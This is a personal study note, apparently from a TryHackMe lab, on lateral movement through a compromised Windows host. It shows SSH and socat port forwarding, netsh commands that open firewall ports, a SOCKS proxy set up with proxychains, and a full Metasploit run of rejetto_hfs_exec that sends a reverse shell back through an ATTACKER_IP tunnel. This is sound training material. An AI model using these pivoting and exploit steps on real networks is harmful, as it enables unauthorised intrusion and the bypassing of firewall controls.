# Lateral Movement

## Port forwarding

### SSH Tunnelling

```
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

SSH Tunnelling can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation. To explain each case, let's assume a scenario where we've gained control over the PC-1 machine (it doesn't need to be administrator access) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker's PC, which will act as an SSH server. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.
![[Pasted image 20230422173125.png]]

### SSH Remote Port Forwarding

 Let's assume that firewall policies block the attacker's machine from directly accessing port 3389 on the server. If the attacker has previously compromised PC-1 and, in turn, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. Remote port forwarding allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a remote SSH server (the attacker's machine).
 
 As a result, a port will be opened in the attacker's machine that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1:

![[Pasted image 20230422173210.png]]

Referring to the previous image, to forward port 3389 on the server back to our attacker's machine, we can use the following command on PC-1:
```  
C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```
`-N` Prevents the client from running a shell.
`-R` Used to request a remote port forward and the syntax requires us to first indicate which port will be opening at the ssh server, followed by the IP and a semicolon to the port we will be forwarding.

Then we can conenct through rdp.
 ```        
exzh@kali$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

### SSH Local Port Forwarding

Local port forwarding allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.

**Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back** to us or simply make any service we want available to machines that have no direct connection to us.
![[Pasted image 20230422173508.png]]

```
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

`-L` Flag is used for local portforwarding. Thgis requires us to indicate the local socket used by PC-1 to receive connctions `*:80` and the remote socket to connect to from the attackers pc perspective (127.0.0.1:80)

Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with `dir=in`). Administrative privileges are needed for this:

```
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

Once your tunnel is set up, any user pointing their browsers to PC-1 at http://2.2.2.2:80 and see the website published by the attacker's machine.

### Port Forwarding With socat

**In situations where SSH is not available, socat can be used to perform similar functionality. While not as flexible as SSH, socat allows you to forward ports in a much simpler way**. One of the disadvantages of using socat is that we need to transfer it to the pivot host (PC-1 in our current example), making it more detectable than SSH, but it might be worth a try where no other option is available.

The basic syntax to perform port forwarding using socat is much simpler. If we wanted to open port 1234 on a host and forward any connection we receive there to port 4321 on host 1.1.1.1, you would have the following command:

```
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

```ad-note
The `fork` option allows socat to fork a new process for each connection received, making it possible to handle multiple connections without closing
```

Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to:
![[Pasted image 20230422174016.png]]
As usual, since a port is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port:
```
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```
If, on the other hand, we'd like to expose port 80 from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:
```      
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```
![[Pasted image 20230422174130.png]]

### Dynamic Port Forwarding and SOCKS

While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, dynamic port forwarding allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a SOCKS proxy.
```
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N   
```
Change Port in `etc/proxychains.conf`
```
[ProxyList]
socks4  127.0.0.1 9050
```
The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel.
```
proxychains curl http://pxeboot.za.tryhackme.com
```

## Exploit Tunneling

```
ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```
8888 is the server port that we want to access
6666 is our serverport
7878 is our listening port
```
user@AttackBox$ msfconsole
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

```ad-important
ReverseListenerBindAddress, which can be used to specify the listener's bind address on the attacker's machine separately from the address where the payload will connect back. In our example, we want the reverse shell listener to be bound to 127.0.0.1 on the attacker's machine and the payload to connect back to THMJMP2 (as it will be forwarded to the attacker machine through the SSH tunnel).
```

```ad-important
Our exploit must also run a web server to host and send the final payload back to the victim server. We use SRVHOST to indicate the listening address, which in this case is 127.0.0.1, so that the attacker machine binds the webserver to localhost. While this might be counterintuitive, as no external host would be able to point to the attacker's machine localhost, the SSH tunnel will take care of forwarding any connection received on THMJMP2 at SRVPORT back to the attacker's machine.
```

```ad-important
The RHOSTS is set to point to 127.0.0.1 as the SSH tunnel will forward the requests to THMDC through the SSH tunnel established with THMJMP2. RPORT is set to 8888, as any connection sent to that port on the attacker machine will be forwarded to port 80 on THMDC.
```

